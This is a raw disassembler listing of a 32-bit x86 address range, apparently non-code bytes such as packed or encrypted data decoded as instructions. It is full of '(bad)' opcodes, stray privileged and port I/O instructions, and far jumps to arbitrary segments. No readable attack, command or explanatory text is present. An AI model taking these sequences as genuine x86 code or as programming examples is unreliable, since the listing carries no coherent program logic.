  425266:	test   al,0x4b
  425269:	add    al,0xcd
  42526b:	jae    0x425250
  42526d:	or     BYTE PTR [eax+ebx*8-0x6d51bc16],bl
  425274:	pop    ebp
  425275:	jae    0x425281
  425277:	dec    edi
  425278:	push   edi
  425279:	sub    BYTE PTR [ebp+0x3b],0x3b
  42527d:	fldcw  WORD PTR [ecx-0x52715082]
  425283:	sbb    ah,BYTE PTR [ebx]
  425285:	dec    edx
  425286:	scas   al,BYTE PTR es:[edi]
  425287:	test   al,0x7c
  425289:	(bad)  
  42528a:	jmp    0x2e2a:0xb1fe8224
  425291:	mov    edx,0x38efad44
  425296:	pop    esi
  425297:	not    BYTE PTR [eax+0x1c]
  42529a:	push   0xffffffaf
  42529c:	clc    
  42529d:	push   ecx
  42529e:	mov    ebp,0x9acae3d8
  4252a3:	imul   edx,DWORD PTR [edx+0x77],0xfcf4b5bb
  4252aa:	sub    ah,BYTE PTR [esi+0x51]
  4252ad:	shr    DWORD PTR [eax+0x30b32876],0x49
  4252b4:	(bad)  
  4252b5:	jne    0x425320
  4252b7:	pop    ebp
  4252b8:	cmp    BYTE PTR [eax-0x2],ch
  4252bb:	adc    al,0xaa
  4252bd:	push   ss
  4252be:	int    0xea
  4252c0:	inc    ecx
	...
  425331:	add    BYTE PTR [eax],al
  425333:	add    BYTE PTR [edx-0x24582da],cl
  425339:	sti    
  42533a:	iret   
  42533b:	and    DWORD PTR ss:[ebx+0x1a],ebx
  42533f:	repnz sub BYTE PTR [esi-0x73ede064],0x1
  425347:	add    ch,dh
  425349:	add    BYTE PTR [eax],al
  42534b:	add    ah,dl
  42534d:	ins    DWORD PTR es:[edi],dx
  42534e:	push   eax
  42534f:	and    eax,0x8e440319
  425354:	sub    eax,0x45a8492
  425359:	pop    ecx
  42535a:	sbb    edx,DWORD PTR [edi+0x56]
  42535d:	call   0xb5c4:0xe4ccb436
  425364:	outs   dx,BYTE PTR fs:[esi]
  425366:	in     eax,0x39
  425368:	sbb    eax,0xfe544e0f
  42536d:	mov    al,0x9b
  42536f:	pop    esi
  425370:	in     eax,0x50
  425372:	clc    
  425373:	sub    esp,ecx
  425375:	mov    ecx,0x55cc80c9
  42537a:	inc    esp
  42537b:	jg     0x425309
  42537d:	adc    al,0x6f
  42537f:	hlt    
  425380:	inc    edi
  425381:	test   DWORD PTR [edi-0x7f8e9c3b],ebp
  425387:	fisubr DWORD PTR [ecx-0x1bcb29ab]
  42538d:	jns    0x425346
  42538f:	xor    al,0xd5
  425391:	inc    esp
  425392:	and    al,0xfa
  425394:	sub    dh,BYTE PTR [eax+ebp*1+0x4fca2216]
  42539b:	and    al,0x2a
  42539d:	rcl    BYTE PTR [edi+0x745cc9da],cl
  4253a3:	mov    al,0x45
  4253a5:	ficomp DWORD PTR [ecx+0x7167e0dc]
  4253ab:	push   esi
  4253ac:	mul    DWORD PTR [edx]
  4253ae:	sbb    BYTE PTR [esi],cl
  4253b0:	inc    edi
  4253b1:	jbe    0x4253bf
  4253b3:	mov    bl,0xe6
  4253b5:	hlt    
  4253b6:	adc    dh,bl
  4253b8:	(bad)  
  4253b9:	test   al,0x94
  4253bb:	test   BYTE PTR [ebx+0x1d],al
  4253be:	stos   BYTE PTR es:[edi],al
  4253bf:	inc    ebp
  4253c0:	jnp    0x425385
  4253c2:	jnp    0x425416
  4253c4:	shl    ch,0xb
  4253c7:	(bad)  
  4253c8:	mov    WORD PTR gs:[ecx+0x395bbb01],gs
  4253cf:	scas   al,BYTE PTR es:[edi]
  4253d0:	cmp    al,0x47
  4253d2:	fsubrp st(1),st
  4253d4:	adc    BYTE PTR [edx],ch
  4253d6:	fwait
  4253d7:	ins    BYTE PTR es:[edi],dx
  4253d8:	retf   0x69aa
  4253db:	xchg   esi,eax
  4253dc:	retf   
  4253dd:	aad    0xfa
  4253df:	mov    ds:0xa80e916,al
  4253e4:	sub    dl,0x9c
  4253e7:	pop    esp
  4253e8:	mov    ds:0xdda5dead,al
  4253ed:	stc    
  4253ee:	pusha  
  4253ef:	pop    edi
  4253f0:	jo     0x4253fc
  4253f2:	adc    DWORD PTR [ebp-0x16],ebx
  4253f5:	lods   eax,DWORD PTR ds:[esi]
  4253f6:	push   ecx
  4253f7:	jno    0x425475
  4253f9:	and    edi,esp
  4253fb:	and    al,BYTE PTR [ebp-0x48e9c3d0]
  425401:	data16 (bad) 
  425403:	sbb    al,0xe2
  425405:	or     al,0x77
  425407:	push   esp
  425408:	push   ds
  425409:	and    al,0x1c
  42540b:	pop    esi
  42540c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42540d:	popa   
  42540e:	and    BYTE PTR [edi],ch
  425410:	or     BYTE PTR [esi-0x3cf57ce7],bl
  425416:	std    
  425417:	sub    al,0x53
  425419:	clc    
  42541a:	clc    
  42541b:	js     0x425477
  42541d:	pop    ds
  42541e:	shl    DWORD PTR [eax+ebp*2-0x5cc2e2ff],0x70
  425426:	gs or  al,0xb5
  425429:	mov    DWORD PTR [ecx],ebx
  42542b:	push   0x29ca1758
  425430:	out    dx,al
  425431:	outs   dx,DWORD PTR ds:[esi]
  425432:	xlat   BYTE PTR ds:[ebx]
  425433:	(bad)  
  425434:	aaa    
  425435:	add    DWORD PTR [ecx+eiz*1+0x1d],ebp
  425439:	cmp    ah,cl
  42543b:	fcom   DWORD PTR ds:0x64e054d7
	...
  4254b1:	add    BYTE PTR [eax],al
  4254b3:	add    al,ah
  4254b5:	outs   dx,DWORD PTR ds:[esi]
  4254b6:	xchg   esi,eax
  4254b7:	inc    edx
  4254b8:	lahf   
  4254b9:	sti    
  4254ba:	hlt    
  4254bb:	out    dx,eax
  4254bc:	cmp    dh,BYTE PTR [ebx]
  4254be:	loop   0x42544b
  4254c0:	(bad)  
  4254c1:	int    0x59
  4254c3:	mov    esi,0x18d07
  4254c8:	cmc    
  4254c9:	add    BYTE PTR [eax],al
  4254cb:	add    bl,cl
  4254cd:	dec    ecx
  4254cf:	pushf  
  4254d0:	or     DWORD PTR [edx*2+0x2897ece6],ecx
  4254d7:	sub    BYTE PTR [ebx+0x22],ch
  4254da:	jecxz  0x42546e
  4254dc:	mov    eax,ds:0xfa51c8ba
  4254e1:	addr16 xor ecx,eax
  4254e4:	int    0x6c
  4254e6:	ret    
  4254e7:	mov    DWORD PTR [eax-0xecc9f2d],edx
  4254ed:	lock jmp 0x425496
  4254f0:	aam    0x85
  4254f2:	jae    0x4254ed
  4254f4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4254f5:	lock and BYTE PTR fs:[ebx],cl
  4254f9:	xor    cl,BYTE PTR [ebp+edx*4-0x5]
  4254fd:	sbb    BYTE PTR [ebp+0x3a],al
  425500:	jno    0x42549f
  425502:	addr16 std 
  425504:	sbb    esi,ecx
  425506:	sub    DWORD PTR [edi+0x3a731c52],esi
  42550c:	imul   eax,DWORD PTR [eax+ebp*1+0x26],0xffffffee
  425511:	out    0x38,eax
  425513:	add    al,0xfd
  425515:	push   edx
  425516:	aaa    
  425517:	sbb    DWORD PTR [ecx+0xc77d86f],ecx
  42551d:	cmp    edi,edi
  42551f:	cmp    dl,0x32
  425522:	sub    BYTE PTR [ebx],cl
  425524:	js     0x425574
  425526:	rcr    esp,cl
  425528:	enter  0x73df,0x59
  42552c:	ins    DWORD PTR es:[edi],dx
  42552d:	jmp    0x4255a5
  42552f:	mov    eax,ds:0xf01a4f1f
  425534:	bound  eax,QWORD PTR [ecx]
  425536:	ins    DWORD PTR es:[edi],dx
  425537:	div    ebp
  425539:	mov    DWORD PTR [ebp+0x55],edx
  42553c:	fild   QWORD PTR [edx+0x1530230b]
  425542:	int    0xd7
  425544:	sbb    eax,0x62d80b2f
  425549:	mov    ?,WORD PTR [edi+0x45]
  42554c:	mov    eax,DWORD PTR [eax+0x57f14991]
  425552:	retf   0x14b4
  425555:	mov    ah,BYTE PTR [edx-0x43]
  425558:	push   ecx
  425559:	push   ax
  42555b:	iret   
  42555c:	cli    
  42555d:	scas   eax,DWORD PTR es:[edi]
  42555e:	nop
  42555f:	lea    esi,[edx-0x5a]
  425562:	mov    cl,0xa0
  425564:	leave  
  425565:	add    cl,BYTE PTR [ebp-0x70]
  425568:	xchg   DWORD PTR [eax+0x6c],edx
  42556b:	icebp  
  42556c:	push   0xf
  42556e:	pop    edx
  42556f:	pop    ebx
  425570:	xchg   BYTE PTR [ebp-0x33],dh
  425573:	dec    ebx
  425574:	pop    esi
  425575:	(bad)  
  425576:	icebp  
  425577:	test   DWORD PTR [edx],0x9af80866
  42557d:	push   edi
  42557e:	xor    ah,dl
  425580:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425581:	retf   
  425582:	jecxz  0x425541
  425584:	mov    esi,0xa68d850b
  425589:	pop    es
  42558a:	sub    BYTE PTR [esi+edx*1-0x1d6e7753],ch
  425591:	xchg   esp,eax
  425592:	ja     0x42553c
  425594:	mov    bl,0x2e
  425596:	add    edi,DWORD PTR [esi-0x3de312d0]
  42559c:	test   eax,0x43ade965
  4255a1:	(bad)  
  4255a2:	addr16 push 0xcb76c0ce
  4255a8:	push   ss
  4255a9:	ret    0xfb18
  4255ac:	jnp    0x425580
  4255ae:	add    DWORD PTR [ebp+0x1f],esp
  4255b1:	and    al,0x96
  4255b3:	retf   0x97cc
  4255b6:	or     BYTE PTR ds:0xe4645d0c,bl
  4255bc:	cdq    
  4255bd:	std    
  4255be:	mov    ch,0xbb
  4255c0:	icebp  
	...
  425631:	add    BYTE PTR [eax],al
  425633:	add    BYTE PTR [edx+edx*4-0x10004],bh
  42563a:	mov    edi,0x14500ad3
  42563f:	into   
  425640:	frstor [ebx-0x7203e6a4]
  425646:	add    DWORD PTR [eax],eax
  425648:	cmc    
  425649:	add    BYTE PTR [eax],al
  42564b:	add    BYTE PTR [eax-0x8bcdb8e],ah
  425651:	inc    esi
  425652:	adc    cl,0x3
  425655:	clc    
  425656:	ds mov bh,0xe7
  425659:	call   0xe13:0xf299034
  425660:	rol    DWORD PTR [edi+eiz*2],cl
  425663:	imul   eax,DWORD PTR [edx-0x588c53bb],0xffffff9b
  42566a:	or     dl,BYTE PTR [ebp+0x32]
  42566d:	add    eax,0xc7414f04
  425672:	cmp    esp,ebp
  425674:	retfw  0x966
  425678:	ffree  st(4)
  42567a:	enter  0x86f9,0x52
  42567e:	repz inc ebx
  425680:	fdivr  QWORD PTR [edi-0x3076a362]
  425686:	xchg   ebx,eax
  425687:	pop    ss
  425688:	es stos BYTE PTR es:[edi],al
  42568a:	pop    esi
  42568b:	cmp    dl,dh
  42568d:	jo     0x42564f
  42568f:	jae    0x4256c5
  425691:	lods   eax,DWORD PTR ds:[esi]
  425692:	dec    edi
  425693:	mov    DWORD PTR ds:0xbc910164,eax
  425699:	push   0x65
  42569b:	iret   
  42569c:	ins    BYTE PTR es:[edi],dx
  42569d:	xor    BYTE PTR ds:[esi+0x2f],al
  4256a1:	mov    BYTE PTR [edx+0x52],bl
  4256a4:	in     eax,0xe1
  4256a6:	outs   dx,DWORD PTR ds:[esi]
  4256a7:	cmc    
  4256a8:	add    DWORD PTR [edx],0x46976f50
  4256ae:	mov    edi,esi
  4256b0:	or     BYTE PTR [ebx-0x4b52bbb6],bl
  4256b6:	jle    0x425700
  4256b8:	sbb    DWORD PTR [edi+0x77],eax
  4256bb:	cmp    ch,BYTE PTR [ecx]
  4256bd:	mov    ebp,edi
  4256bf:	xor    BYTE PTR [eax],dh
  4256c1:	out    dx,eax
  4256c2:	xlat   BYTE PTR ds:[ebx]
  4256c3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4256c4:	mov    ah,0x7c
  4256c6:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4256c7:	inc    eax
  4256c8:	jae    0x4256ed
  4256ca:	lahf   
  4256cb:	add    dh,BYTE PTR [edi]
  4256cd:	loopne 0x4256f6
  4256cf:	push   cs
  4256d0:	xchg   BYTE PTR [esp+edx*2-0x323aa761],ah
  4256d7:	xchg   esi,eax
  4256d8:	mov    al,0xfe
  4256da:	retf   
  4256db:	out    0x7c,al
  4256dd:	(bad)  
  4256de:	aam    0xef
  4256e0:	push   eax
  4256e1:	push   0xffffffaa
  4256e3:	push   0xffffffac
  4256e5:	cmc    
  4256e6:	in     eax,0x13
  4256e8:	mov    esi,0x3e143521
  4256ed:	jae    0x425739
  4256ef:	push   0xb15cc654
  4256f4:	(bad)  [ecx+0x0]
  4256f7:	mov    eax,ds:0x2c13325f
  4256fc:	adc    eax,0x9a65d922
  425701:	jecxz  0x4256a0
  425703:	and    al,0x17
  425705:	sbb    esi,0x7153711f
  42570b:	scas   eax,DWORD PTR es:[edi]
  42570c:	pop    ebx
  42570d:	jg     0x425731
  42570f:	(bad)  
  425710:	in     eax,dx
  425711:	jnp    0x42573a
  425713:	stc    
  425714:	retf   
  425715:	sbb    esp,ecx
  425717:	adc    bh,cl
  425719:	mov    ch,0xf3
  42571b:	int3   
  42571c:	je     0x4256c4
  42571e:	clc    
  42571f:	ss je  0x425773
  425722:	pop    edx
  425723:	sbb    eax,0xcf35becc
  425728:	gs pop es
  42572a:	arpl   WORD PTR [ebp+0x15],bp
  42572d:	and    eax,DWORD PTR [esi-0xa]
  425730:	inc    ebx
  425731:	sub    al,0x84
  425733:	stc    
  425734:	add    DWORD PTR [ebp+0x50e81d22],edi
  42573a:	mov    ecx,DWORD PTR es:[ebx+0x63]
  42573e:	xor    bh,BYTE PTR [ecx+esi*4+0x0]
	...
  4257b1:	add    BYTE PTR [eax],al
  4257b3:	add    BYTE PTR [edx],ah
  4257b5:	pop    eax
  4257b6:	test   bh,ch
  4257b8:	(bad)  
  4257b9:	jmp    FWORD PTR [ebx-0x23]
  4257bc:	jp     0x425751
  4257be:	cmp    edx,esp
  4257c0:	imul   ecx,DWORD PTR [ebp-0x710ef0f0],0xf50001
  4257ca:	add    BYTE PTR [eax],al
  4257cc:	stos   BYTE PTR es:[edi],al
  4257cd:	lock cs pop ecx
  4257d0:	xor    DWORD PTR [eax],0x7a
  4257d3:	movs   BYTE PTR es:[edi],BYTE PTR cs:[esi]
  4257d5:	and    al,0xcb
  4257d7:	and    dh,cl
  4257d9:	ins    BYTE PTR es:[edi],dx
  4257da:	out    dx,eax
  4257db:	sub    bl,BYTE PTR ds:0x66a4a2ea
  4257e1:	out    0xf8,eax
  4257e3:	mov    al,0xb8
  4257e5:	(bad)  
  4257e6:	pushf  
  4257e7:	sbb    DWORD PTR [eax+0x1f],esi
  4257ea:	add    eax,0x6e7b23ba
  4257ef:	or     al,BYTE PTR [ecx]
  4257f1:	repnz gs mov edx,0xb7a0e28c
  4257f8:	adc    esi,DWORD PTR [edx]
  4257fa:	out    dx,eax
  4257fb:	inc    ebx
  4257fc:	mov    ecx,0x313130a3
  425801:	(bad)  
  425802:	test   al,0x58
  425804:	ret    0xc970
  425807:	dec    ecx
  425808:	xchg   ecx,eax
  425809:	ret    0x4daf
  42580c:	out    dx,al
  42580d:	aam    0xb8
  42580f:	cmp    al,0x2c
  425811:	adc    al,0x8b
  425813:	push   ebx
  425814:	mov    al,0xb8
  425816:	dec    ebp
  425817:	jp     0x4257fb
  425819:	cmp    eax,0xb778e5d3
  42581e:	ror    ecx,cl
  425820:	mul    dh
  425822:	and    dl,ch
  425824:	jle    0x4257d7
  425826:	jnp    0x4257e5
  425828:	int    0x40
  42582a:	pop    ss
  42582b:	aam    0x65
  42582d:	scas   eax,DWORD PTR es:[edi]
  42582e:	sti    
  42582f:	pop    ebp
  425830:	cmc    
  425831:	jmp    0x5bc330a8
  425836:	(bad)  
  425837:	fild   QWORD PTR [ebx-0x1f]
  42583a:	inc    ebp
  42583b:	ret    0x37d4
  42583e:	inc    edx
  42583f:	cmp    dl,BYTE PTR [ebx-0x4e]
  425842:	(bad)  
  425843:	ins    BYTE PTR es:[edi],dx
  425844:	mov    ds,WORD PTR [ebx+ebp*1+0x541ed049]
  42584b:	inc    edx
  42584c:	pop    eax
  42584d:	and    edi,DWORD PTR [ebx-0x7f]
  425850:	in     eax,dx
  425851:	clc    
  425852:	fdivr  DWORD PTR [edx+eiz*4]
  425855:	sub    al,al
  425857:	iret   
  425858:	lods   al,BYTE PTR ds:[esi]
  425859:	jmp    0x5124:0x76fb4692
  425860:	icebp  
  425861:	pop    eax
  425862:	dec    ecx
  425863:	test   al,0xcc
  425865:	dec    ax
  425867:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425868:	pop    ax
  42586a:	addr16 jp 0x425883
  42586d:	int3   
  42586e:	ds pop ecx
  425870:	ss mov ch,0xad
  425873:	and    ebx,edx
  425875:	out    0xe1,al
  425877:	int3   
  425878:	and    DWORD PTR [edx+0x6b3ae9e4],ecx
  42587e:	js     0x425868
  425880:	(bad)  
  425882:	repnz push es
  425884:	dec    eax
  425885:	mov    edi,0xa6849ea5
  42588a:	or     al,0xd3
  42588c:	xor    cl,ah
  42588e:	jp     0x4258d7
  425890:	mov    bl,0x1f
  425892:	int3   
  425893:	rcl    BYTE PTR [ebx-0x3170beec],cl
  425899:	mov    ds:0x5bc808f0,eax
  42589e:	xchg   esi,eax
  42589f:	xchg   esi,eax
  4258a0:	scas   eax,DWORD PTR es:[edi]
  4258a1:	hlt    
  4258a2:	ja     0x425858
  4258a4:	mov    dl,0x3
  4258a6:	lea    edx,[edx+ecx*2+0x1]
  4258aa:	sub    eax,0x1b2f043
  4258af:	cdq    
  4258b0:	inc    ebx
  4258b1:	scas   al,BYTE PTR es:[edi]
  4258b2:	repnz movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4258b4:	addr16 std 
  4258b6:	or     dl,BYTE PTR [ebx+0x26]
  4258b9:	cmp    BYTE PTR [ebp-0x21ad23b3],cl
  4258bf:	bound  ebx,QWORD PTR [edx]
	...
  425931:	add    BYTE PTR [eax],al
  425933:	add    BYTE PTR [ebx+0x18],ch
  425936:	arpl   WORD PTR [edx+0x73],bp
  425939:	jnp    0x4259a6
  42593b:	sbb    esp,esp
  42593d:	xchg   edi,eax
  42593e:	sub    DWORD PTR [ecx],edi
  425940:	es pop ebp
  425942:	push   es
  425943:	jmp    0x43e92e
  425948:	cmc    
  425949:	add    BYTE PTR [eax],al
  42594b:	add    BYTE PTR [esi+0x64],bh
  42594e:	pop    edi
  42594f:	dec    ebx
  425950:	add    edx,eax
  425952:	addr16 es dec esi
  425955:	dec    esp
  425956:	std    
  425957:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425958:	sub    cl,ah
  42595a:	cmp    eax,0x87ae7391
  42595f:	pop    ebx
  425960:	in     al,0x3c
  425962:	sub    eax,0x83423895
  425967:	call   0xd41e:0xe943da1a
  42596e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42596f:	jge    0x4258fa
  425971:	jg     0x4258fb
  425973:	fs push esp
  425975:	stos   BYTE PTR es:[edi],al
  425976:	test   BYTE PTR [eax],cl
  425978:	jp     0x42591d
  42597a:	test   eax,0x39d8ba1b
  42597f:	sbb    al,0x90
  425981:	imul   edi,DWORD PTR [esi-0x46c9b04c],0xffffffdd
  425988:	and    DWORD PTR [ebx+0x23d6efb0],ecx
  42598e:	lds    esp,FWORD PTR [edi-0x9]
  425991:	jg     0x425967
  425993:	adc    DWORD PTR [ebx+0x7836f709],ecx
  425999:	mov    al,0xaa
  42599b:	popa   
  42599c:	jp     0x42596d
  42599e:	pop    ebp
  42599f:	imul   esp,edi,0xb8cac798
  4259a5:	mov    esi,DWORD PTR ss:[edi]
  4259a8:	(bad)  
  4259a9:	hlt    
  4259aa:	sahf   
  4259ab:	sbb    BYTE PTR [edi*4-0x749a516a],0x4
  4259b3:	sahf   
  4259b4:	mov    al,ds:0xe99a3011
  4259b9:	imul   ebx,DWORD PTR [eax+0x6f],0xffffffe0
  4259bd:	sub    BYTE PTR [edi],bl
  4259bf:	sub    esi,DWORD PTR [edx+0x53505415]
  4259c5:	jno    0x425a29
  4259c7:	adc    eax,0xab89da10
  4259cc:	add    BYTE PTR [eax-0x70],dh
  4259cf:	or     ecx,edx
  4259d1:	mul    BYTE PTR [eax]
  4259d3:	mov    eax,ds:0x88bf7fc6
  4259d8:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4259d9:	dec    esp
  4259da:	fild   DWORD PTR [ebx-0x49]
  4259dd:	mov    ch,BYTE PTR [esi]
  4259df:	sbb    ecx,DWORD PTR [ecx-0x46920bb0]
  4259e5:	clc    
  4259e6:	jbe    0x425a26
  4259e8:	cmp    DWORD PTR ds:0x842bf9f9,edx
  4259ee:	aam    0x22
  4259f0:	imul   esi,DWORD PTR [ecx-0x689789fa],0x1baa2313
  4259fa:	pop    edx
  4259fb:	sar    eax,0xab
  4259fe:	call   0x1759:0x4970a512
  425a05:	adc    DWORD PTR [ebp+0x416684b],ebp
  425a0b:	xchg   BYTE PTR [esi+eiz*2+0x34032c6a],cl
  425a12:	arpl   WORD PTR [ebx],dx
  425a14:	cmp    al,0xd6
  425a16:	jmp    0xb032ffcc
  425a1b:	jecxz  0x425a3d
  425a1d:	sub    eax,DWORD PTR [edi+0x16]
  425a20:	push   0xc60a1bf0
  425a25:	dec    esi
  425a26:	dec    DWORD PTR [edx+ebx*8]
  425a29:	adc    edx,DWORD PTR [eax+0x69]
  425a2c:	out    0x92,eax
  425a2e:	sar    DWORD PTR [esi],cl
  425a30:	(bad)  
  425a31:	push   ebx
  425a32:	comiss xmm2,DWORD PTR [ebx]
  425a35:	aas    
  425a36:	xor    BYTE PTR [eax+0xe],bl
  425a39:	pop    ebx
  425a3a:	lahf   
  425a3b:	clc    
  425a3c:	(bad)  [esi-0x74]
  425a3f:	jmp    0x425b22
	...
  425ab4:	push   es
  425ab5:	aas    
  425ab6:	or     eax,0xb6bb3db9
  425abb:	mov    edi,0xa9fcb6ec
  425ac0:	fild   WORD PTR [edi-0x6f24eb97]
  425ac6:	add    DWORD PTR [eax],eax
  425ac8:	cmc    
  425ac9:	add    BYTE PTR [eax],al
  425acb:	add    bl,bh
  425acd:	mov    bh,0x99
  425acf:	mov    dh,0x51
  425ad1:	jae    0x425aeb
  425ad3:	das    
  425ad4:	clc    
  425ad5:	shl    DWORD PTR [esi+0x684eb2a5],cl
  425adb:	sbb    eax,0x60e7bb2c
  425ae0:	push   esi
  425ae1:	inc    edi
  425ae2:	xchg   ebp,eax
  425ae3:	inc    edx
  425ae4:	mov    al,ds:0xb190ae8d
  425ae9:	cmp    dl,bl
  425aeb:	jns    0x425a70
  425aed:	(bad)  
  425aee:	sbb    ecx,DWORD PTR [edi+0xb865a92]
  425af4:	push   edx
  425af5:	hlt    
  425af6:	sti    
  425af7:	cmp    BYTE PTR [edx-0x14],ch
  425afa:	call   DWORD PTR [edi]
  425afc:	loopne 0x425ab6
  425afe:	sbb    BYTE PTR [esi+0x50e01204],bl
  425b04:	out    dx,eax
  425b05:	mov    edi,0x31299e74
  425b0a:	out    0x80,eax
  425b0c:	xchg   esi,eax
  425b0d:	mov    bh,bh
  425b0f:	mov    WORD PTR [ecx+0x8],es
  425b12:	aas    
  425b13:	mov    ah,0x6f
  425b15:	mov    cl,0x1b
  425b17:	fcomp  QWORD PTR [edx]
  425b19:	loopne 0x425b84
  425b1b:	hlt    
  425b1c:	xor    BYTE PTR [ebp+0xa5b2aa8],0x58
  425b23:	adc    eax,0xe203a2e
  425b28:	mov    bh,0x8f
  425b2a:	inc    ebx
  425b2b:	xchg   ebp,eax
  425b2c:	mov    bh,0x83
  425b2e:	adc    al,dh
  425b30:	mov    al,0x88
  425b32:	sar    esp,cl
  425b34:	and    al,0xe3
  425b36:	pop    ebx
  425b37:	nop
  425b38:	jecxz  0x425af7
  425b3a:	fdiv   DWORD PTR [ebx-0x43]
  425b3d:	adc    al,0x1
  425b3f:	and    cl,BYTE PTR cs:[esi]
  425b42:	dec    eax
  425b43:	shl    BYTE PTR [esi+0x70],cl
  425b46:	push   es
  425b47:	loopne 0x425b3e
  425b49:	or     al,0x23
  425b4b:	and    DWORD PTR [edx+0x71],esi
  425b4e:	loopne 0x425b38
  425b50:	repz addr16 mov dl,0xbc
  425b54:	xchg   ebp,ebp
  425b56:	pop    esp
  425b57:	lods   al,BYTE PTR ds:[esi]
  425b58:	jp     0x425b1c
  425b5a:	ins    DWORD PTR es:[edi],dx
  425b5b:	sbb    al,0xdd
  425b5d:	rcr    ecx,cl
  425b5f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425b60:	inc    esi
  425b61:	vpsraw xmm7,xmm3,xmm1
  425b65:	sahf   
  425b66:	outs   dx,DWORD PTR ds:[esi]
  425b67:	or     ch,BYTE PTR [esi]
  425b69:	mov    bl,BYTE PTR [ebp+0x1e]
  425b6c:	add    eax,0x575aeb22
  425b71:	sti    
  425b72:	ret    0xab1b
  425b75:	out    dx,eax
  425b76:	dec    ebx
  425b77:	fadd   DWORD PTR [esi-0x64c9022d]
  425b7d:	ss pop ebx
  425b7f:	popf   
  425b80:	dec    ebp
  425b82:	mov    bh,0x54
  425b84:	leave  
  425b85:	cmp    BYTE PTR [eax+0x30],al
  425b88:	or     eax,0x81dbac08
  425b8d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  425b8e:	add    cl,cl
  425b90:	cmc    
  425b91:	js     0x425bfe
  425b93:	test   BYTE PTR [ecx+ebp*8-0x26],0x13
  425b98:	aad    0x6b
  425b9a:	xchg   esi,eax
  425b9b:	mov    bh,0x7b
  425b9d:	popa   
  425b9e:	dec    ebx
  425b9f:	sar    BYTE PTR ds:0xc6b057a2,1
  425ba5:	push   ss
  425ba6:	mov    ah,0x79
  425ba8:	jmp    0x425bd8
  425baa:	shl    DWORD PTR [ebx+edi*4-0x3a7c16ff],0xe9
  425bb2:	and    ch,BYTE PTR [ecx+0x64]
  425bb5:	xchg   edi,eax
  425bb6:	add    dl,0xc7
  425bb9:	pop    esp
  425bba:	sbb    ah,BYTE PTR ds:0x25ac19a7
  425bc0:	xchg   BYTE PTR [eax],al
	...
  425c32:	add    BYTE PTR [eax],al
  425c34:	ins    BYTE PTR es:[edi],dx
  425c35:	fidiv  DWORD PTR [edx+ebp*2-0x2101914a]
  425c3c:	cli    
  425c3d:	sub    ch,cl
  425c3f:	call   0x91d0:0x8c591286
  425c46:	add    DWORD PTR [eax],eax
  425c48:	cmc    
  425c49:	add    BYTE PTR [eax],al
  425c4b:	add    BYTE PTR [eax+0x6b],ah
  425c4e:	cmp    ah,BYTE PTR [ecx]
  425c50:	sbb    eax,0xae3f9d4c
  425c55:	dec    DWORD PTR [ebx+0x360c8559]
  425c5b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425c5c:	sbb    al,BYTE PTR [eax+0x3b]
  425c5f:	xor    eax,0x9086bcd0
  425c64:	lods   eax,DWORD PTR ds:[esi]
  425c65:	fisttp DWORD PTR [edi+0x1e]
  425c68:	xchg   ebx,eax
  425c69:	hlt    
  425c6a:	xsha1  (bad)
  425c6b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  425c6c:	or     eax,0x1a7e026d
  425c71:	push   es
  425c72:	push   ecx
  425c73:	popa   
  425c74:	xor    al,0xfd
  425c76:	rcl    BYTE PTR [ebx+0x49],cl
  425c79:	mov    esi,0x2039cf1f
  425c7e:	pusha  
  425c7f:	outs   dx,DWORD PTR ds:[esi]
  425c80:	ins    BYTE PTR es:[edi],dx
  425c81:	lods   al,BYTE PTR ds:[esi]
  425c82:	sub    al,0x4c
  425c84:	adc    dh,BYTE PTR [esi+0x8]
  425c87:	jmp    0x425c43
  425c89:	mov    ss,WORD PTR [ebp-0x7a]
  425c8c:	inc    ebp
  425c8d:	dec    esp
  425c8e:	jle    0x425c6c
  425c90:	daa    
  425c91:	std    
  425c92:	adc    al,0x4d
  425c94:	xor    DWORD PTR [edi+esi*2+0x39],ebp
  425c98:	and    al,0xef
  425c9a:	or     ebp,DWORD PTR [edx-0x69]
  425c9d:	xor    BYTE PTR [ebx-0x740e5fa1],dl
  425ca3:	and    bh,bl
  425ca5:	dec    eax
  425ca6:	pop    ecx
  425ca7:	sbb    esp,DWORD PTR [ebp-0x62e437e6]
  425cad:	aaa    
  425cae:	xchg   BYTE PTR [edi],dl
  425cb0:	mov    eax,ds:0x4c9b2a44
  425cb5:	add    dh,BYTE PTR [eax+edx*4+0x7b]
  425cb9:	mov    ch,0x17
  425cbb:	fistp  DWORD PTR [edx+0x7b]
  425cbe:	sub    al,0xb9
  425cc0:	scas   al,BYTE PTR es:[edi]
  425cc1:	test   al,0xf6
  425cc3:	addr16 jmp 0x425c9d
  425cc6:	inc    ebp
  425cc7:	mov    ebp,0xa57bf5e8
  425ccc:	pop    es
  425ccd:	cs mov ecx,0x10479bca
  425cd3:	pop    ebx
  425cd4:	das    
  425cd5:	sti    
  425cd6:	arpl   WORD PTR [eax+0x59b1390e],bx
  425cdc:	jnp    0x425d49
  425cde:	(bad)  
  425cdf:	xlat   BYTE PTR ds:[ebx]
  425ce0:	jo     0x425d30
  425ce2:	call   0xe0e72715
  425ce7:	or     esp,0x651f23b9
  425ced:	mov    dl,0x1c
  425cef:	dec    esi
  425cf0:	push   edi
  425cf1:	les    ebx,FWORD PTR [edi]
  425cf3:	mov    ebx,DWORD PTR [edi-0x43f28324]
  425cf9:	clc    
  425cfa:	dec    edx
  425cfb:	mov    al,ds:0xdeaf2a28
  425d00:	mov    WORD PTR [eax],ss
  425d02:	les    eax,FWORD PTR [ebx-0x7d]
  425d05:	jmp    0xdcafda6a
  425d0a:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  425d0b:	and    ebx,esi
  425d0d:	inc    eax
  425d0e:	push   cs
  425d0f:	mov    ch,0x25
